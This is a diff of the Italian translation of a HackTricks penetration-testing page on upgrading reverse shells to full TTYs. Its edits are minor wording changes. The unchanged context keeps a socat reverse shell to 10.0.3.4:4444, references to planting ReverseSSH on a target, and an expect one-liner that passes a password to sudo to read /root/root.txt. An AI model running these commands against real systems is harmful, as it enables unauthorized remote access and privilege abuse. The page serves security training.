@@ -67,7 +67,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 
 ## ReverseSSH
 
-Un modo conveniente per **l'accesso interattivo alla shell**, così come per **trasferimenti di file** e **port forwarding**, è scaricare il server ssh staticamente collegato [ReverseSSH](https://github.com/Fahrj/reverse-ssh) sul bersaglio.
+Un modo conveniente per **accesso shell interattivo**, così come **trasferimenti di file** e **port forwarding**, è scaricare il server ssh staticamente collegato [ReverseSSH](https://github.com/Fahrj/reverse-ssh) sul bersaglio.
 
 Di seguito è riportato un esempio per `x86` con binari compressi upx. Per altri binari, controlla la [pagina delle release](https://github.com/Fahrj/reverse-ssh/releases/latest/).
 
@@ -114,13 +114,13 @@ sftp -P 8888 127.0.0.1
 ```
 ## Penelope
 
-Penelope (https://github.com/brightio/penelope) aggiorna automaticamente le reverse shell Linux a TTY, gestisce la dimensione del terminale, registra tutto e molto altro. Inoltre, fornisce supporto per readline per le shell Windows.
+[Penelope](https://github.com/brightio/penelope) aggiorna automaticamente le reverse shell Linux a TTY, gestisce la dimensione del terminale, registra tutto e molto altro. Inoltre, fornisce supporto per readline per le shell Windows.
 
 ![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)
 
 ## No TTY
 
-Se per qualche motivo non riesci a ottenere un TTY completo, **puoi comunque interagire con i programmi** che si aspettano input dell'utente. Nell'esempio seguente, la password viene passata a `sudo` per leggere un file:
+Se per qualche motivo non riesci a ottenere un TTY completo, **puoi comunque interagire con i programmi** che si aspettano un input dell'utente. Nell'esempio seguente, la password viene passata a `sudo` per leggere un file:
 ```bash
 expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
 ```
@@ -134,7 +134,7 @@ Impara e pratica il hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" dat
 
 * Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.
+* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.
 
 </details>
 {% endhint %}
